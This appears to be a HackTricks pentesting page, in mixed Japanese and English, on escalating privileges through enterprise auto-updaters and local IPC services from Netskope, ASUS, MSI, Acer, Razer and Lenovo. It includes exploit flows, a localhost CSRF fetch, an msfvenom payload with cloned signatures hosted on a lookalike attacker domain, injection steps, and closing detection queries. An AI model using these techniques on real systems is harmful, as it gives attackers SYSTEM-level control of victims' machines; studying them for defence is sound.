# Enterprise Auto-Updaters と Privileged IPC の悪用（例: Netskope, ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、enterprise endpoint agents と updaters に見られる Windows local privilege escalation の一連の手法を一般化します。これらは、低摩擦な IPC surface と privileged update flow を公開しています。代表例は Windows < R129 の Netskope Client（CVE-2025-0309）で、低権限ユーザーが attacker-controlled server への enrollment を強制し、その後 SYSTEM service に malicious MSI をインストールさせることができます。

似たような製品に対して再利用できる key ideas:
- privileged service の localhost IPC を悪用して、attacker server への re-enrollment や reconfiguration を強制する。
- vendor の update endpoints を実装し、rogue Trusted Root CA を配布して、updater を malicious な “signed” package に向ける。
- 弱い signer checks（CN allow-lists）、任意の digest flags、緩い MSI properties を回避する。
- IPC が “encrypted” なら、registry に保存された world-readable な machine identifiers から key/IV を導出する。
- service が caller を image path/process name で制限するなら、allow-listed process に inject するか、suspended で起動して minimal thread-context patch で DLL を bootstrap する。

---
## 1) localhost IPC 経由で attacker server への enrollment を強制する

多くの agents は、JSON を使って localhost TCP 経由で SYSTEM service と通信する user-mode UI process を同梱しています。

Netskope で観測された構成:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host（例: AddonUrl）を制御する claims を持つ JWT enrollment token を作る。alg=None を使って signature が不要になるようにする。
2) provisioning command を呼び出す IPC message を、あなたの JWT と tenant name 付きで送る:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のためにあなたの rogue server にアクセスし始める、例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- もし caller verification が path/name-based なら、allow-listed vendor binary からリクエストを発生させる（§4 を参照）。

---
## 2) 更新チャネルを hijacking して SYSTEM として code を実行する

クライアントがあなたの server と talk するようになったら、期待される endpoints を implement し、attacker MSI に誘導する。典型的な sequence:

1) /v2/config/org/clientconfig → 非常に短い updater interval を持つ JSON config を返す、例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → malicious MSI を指すメタデータと fake version を渡す。

wild でよく見られる common checks の bypass:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけをチェックする場合がある。あなたの rogue CA はその CN を持つ leaf を発行して MSI に sign できる。
- CERT_DIGEST property: CERT_DIGEST という名前の harmless な MSI property を含める。install 時に enforcement はない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）が追加の cryptographic validation を無効化する。

Result: SYSTEM service は以下からあなたの MSI を install する
C:\ProgramData\Netskope\stAgent\data\*.msi
NT AUTHORITY\SYSTEM として arbitrary code を実行する。

Patch-bypass lesson: vendor が cryptographically authenticating the update source ではなく、少数の “trusted” domains を allow-list するだけで対応してきたら、vendor-owned redirector や reverse proxy が still let you steer traffic できないか探すこと。Netskope の case では、その後の public follow-up research により、R129-era の allow-list が `rproxy.goskope.com` を通じて依然として abuse 可能で、そこが attacker-controlled Azure App Service content を proxy していたことが示された。hostname allow-lists は trust boundary ではなく、せいぜい speed bump と考えること。

---
## 3) Encrypted IPC requests を forge する (when present)

R127 から、Netskope は IPC JSON を encryptData field で包み、Base64 のように見せていた。reverse すると、どの user からも readable な registry values から派生した key/IV を使う AES だと分かった:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attacker は encryption を再現し、standard user から valid な encrypted commands を送れる。General tip: agent が突然 IPC を “encrypt” し始めたら、HKLM 下の device IDs, product GUIDs, install IDs を material として探すこと。

---
## 4) IPC caller allow-lists を bypass する (path/name checks)

一部のサービスは、TCP connection の PID を resolve して image path/name を Program Files 配下の allow-listed vendor binaries（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較することで peer を authenticate しようとする。

Two practical bypasses:
- DLL injection を allow-listed process（例: nsdiag.exe）に行い、その中から IPC を proxy する。
- CreateRemoteThread を使わずに allow-listed binary を suspended で spawn し、proxy DLL を bootstrap して driver-enforced tamper rules を満たす（§5 を参照）。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products は protected processes への handles から dangerous rights を strip する minifilter/OB callbacks driver（例: Stadrv）を同梱することが多い:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除する
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限する

これらの制約を尊重する reliable な user-mode loader:
1) CREATE_SUSPENDED で vendor binary の CreateProcess を行う。
2) まだ許可されている handles を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または known な RIP に code を patch するなら THREAD_RESUME だけでもよい）。
3) ntdll!NtContinue（または他の early で guaranteed-mapped な thunk）を、あなたの DLL path で LoadLibraryW を呼んでから元に戻る tiny stub に overwrite する。
4) ResumeThread して in-process で stub を trigger し、DLL を load する。

すでに protected な process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（自分で作成した）ため、driver の policy は満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、そして必要な endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate の提供を自動化する。
- UpSkope は custom IPC client で、任意の（必要に応じて AES-encrypted な）IPC messages を作成し、suspended-process injection も含めて allow-listed binary から発信させる。

## 7) Fast triage workflow for unknown updater/IPC surfaces

新しい endpoint agent や motherboard “helper” suite に向き合うとき、次の quick workflow だけで、privesc の有望な target かどうか大抵は判断できる:

1) loopback listeners を列挙し、vendor processes に紐づける:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補の named pipes を列挙する:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers が使用する registry-backed routing data を掘り起こす:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint 名、JSON key、command ID を抽出する。Packed Electron/.NET frontends は、しばしば完全な schema を漏えいさせる:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 実際の trust predicate を探す。最終的にプロセスを起動する code path だけを探すのではなく:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
優先的に注目すべきパターン:
- `CryptQueryObject`/certificate parsing を `WinVerifyTrust` なしで使っている場合、通常は「certificate が存在する」ことを「certificate が trusted である」と扱っていることを意味し、certificate cloning やその他の fake-signer tricks を可能にします。
- `Origin`、`Referer`、download URLs、process names、または signer CN に対する substring/suffix チェックは authentication ではありません。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains で通常は悪用可能です。
- 低権限の GUI が「the file is trusted」を決定し、SYSTEM broker がその結果を単に消費するだけなら、client-side DLL/JS を patch するか reimplement するだけで boundary を完全に bypass できることがよくあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーしてから、その path から validate したり schedule したりする場合は、即座に TOCTOU replacement windows と、より弱い checks を持つ別の `ExecuteTask()` wrapper を露出する sibling plugin modules をテストしてください。

named-pipe-heavy な target では、PipeViewer は protocol を深く reverse し始める前に weak DACLs と remotely reachable pipes を素早く見つけるのに役立ちます。

target が caller を PID、image path、または process name だけで authenticate している場合、それは boundary というより速度低下要因として扱ってください: 正規の client に inject するか、allow-listed process から connection を張るだけで、server の checks を満たせることがよくあります。named pipes に関しては、[client impersonation と pipe abuse についてのこのページ](named-pipe-client-impersonation.md) がこの primitive をより詳しく説明しています。

---
## 8) vendor signatures のみで認証する modular add-in brokers (Lenovo Vantage pattern)

狙う価値のある新しい variation は **signed-client RPC broker** です: 低権限の Lenovo-signed desktop process が SYSTEM service と通信し、service は JSON commands を `%ProgramData%` 配下の XML-described add-ins セットへ route します。**受け入れられる signed client 内で** code execution を達成できれば、`runas="system"` の contract はすべて attack surface の一部になります。

Lenovo Vantage research で観測された high-value primitives:
- **vendor に signed されているので caller を trust する**: researchers は、Lenovo-signed EXE を writable directory にコピーし、DLL side-load (`profapi.dll`) を満たすことで authenticated context に到達し、service がすでに trust している client 内で arbitrary code を実行しました。
- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` に宣言されており、いくつかの contract は `SYSTEM` として実行されるため、これらの manifests を列挙すると broker 自体を reverse するより早く実際の privileged verbs を見つけられることがよくあります。
- **authenticated channel の背後にある per-command bugs**: trusted client 内に入ると、public research では update/install verbs の path-traversal + race conditions、privileged settings databases での raw-SQL abuse、そして intended hive の外への write を可能にする substring-based registry path checks が見つかりました。

target に対する有用な recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
実践的な要点: helper suite が、まず **caller process** を認証し、その後で多数の plugin/add-in コマンドに振り分ける broker を公開している場合、フロントドアの trust check を回避しただけで止まらないこと。manifest/contract table をダンプし、各 high-privilege verb を個別に fuzz すること。authenticated channel には、たいてい複数の second-stage bugs が隠れている。

---
## 1) ブラウザから localhost への CSRF を使った privileged HTTP APIs 攻撃 (ASUS DriverHub)

DriverHub は、127.0.0.1:53000 上で user-mode HTTP service (ADU.exe) を提供しており、https://driverhub.asus.com から来る browser calls を期待している。origin filter は単純に Origin header と、`/asus/v1.0/*` で公開される download URLs に対して `string_contains(".asus.com")` を実行するだけである。そのため、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host はこの check を通過し、JavaScript から state-changing requests を送信できる。追加の bypass patterns については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。

実践的な流れ:
1) `.asus.com` を含む domain を登録し、そこに malicious webpage をホストする。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` 上の privileged endpoint（例: `Reboot`, `UpdateApp`）を呼び出す。
3) handler が期待する JSON body を送る – packed frontend JS には以下の schema が示されている。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI でさえ、Origin ヘッダーが信頼された値に偽装されている場合は成功する:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: 「helper」スイートを解析する際は、localhost TCP や named pipes で止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility` のような名前の COM classes を確認し、特権サービスが実際に対象 binary 自体を検証しているのか、それとも patchable な user-mode client DLL が計算した結果を単に信頼しているだけなのかを検証する。このパターンは Razer 以外にも一般化できる: 高権限の broker が低権限側からの allow/deny 判定を取り込む split design は、どれも privesc surface 候補になる。

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

2025年6月から2025年12月の間、Notepad++ の update flow 背後の hosting infrastructure を侵害した attackers は、選ばれた victims に対してのみ malicious manifests を選択的に配信した。古い WinGUp ベースの updaters は update authenticity を完全には verify しておらず、hostile な XML response で client を attacker-controlled URLs に redirect できた。client は HTTPS content を受け入れる際に、信頼された certificate chain とダウンロードした installer の valid な PE signature の両方を enforcing していなかったため、victims は trojanized な NSIS `update.exe` を取得して実行した。

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting を compromise し、update checks に attacker metadata で応答して malicious download URL を指し示す。
2. **Trojanized NSIS**: installer が payload を fetch/execute し、2つの execution chains を悪用する:
- **Bring-your-own signed binary + sideload**: signed な Bitdefender `BluetoothService.exe` を bundle し、その search path に malicious な `log.dll` を配置する。signed binary が実行されると、Windows は `log.dll` を sideload し、これが Chrysalis backdoor を decrypt して reflectively load する（static detection を妨げるため Warbird-protected + API hashing）。
- **Scripted shellcode injection**: NSIS が compiled Lua script を実行し、Win32 APIs（例: `EnumWindowStationsW`）を使って shellcode を inject し、Cobalt Strike Beacon を stage する。

Hardening/detection takeaways for any auto-updater:
- ダウンロードした installer の **certificate + signature verification** を強制する（vendor signer を pin し、mismatched な CN/chain は reject する）。update manifest 自体も sign する（例: XMLDSig）。検証されない限り、manifest-controlled redirects は block する。
- **BYO signed binary sideloading** を download 後の detection pivot として扱う: signed な vendor EXE が canonical install path 以外から DLL name を load したとき（例: Bitdefender が `log.dll` を Temp/Downloads から load する場合）や、updater が temp から installer を drop/execute し、vendor 由来でない signatures を持つ場合に alert する。
- この chain で観測された **malware-specific artifacts** を monitor する（generic pivots として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への異常な `gup.exe` writes、Lua-driven の shellcode injection stages。
- Notepad++ は v8.8.9 以降で WinGUp を強化した: 返される XML は現在 signed（XMLDSig）であり、新しい builds では transport のみを信頼せず、ダウンロードした installer の certificate + signature verification を強制している。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、未署名の manifest を受け入れる、または installer の signer を固定できない updater 全般に当てはまります。つまり、network hijack + malicious installer + BYO-signed sideloading により、“trusted” updates の名目で remote code execution が可能になります。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
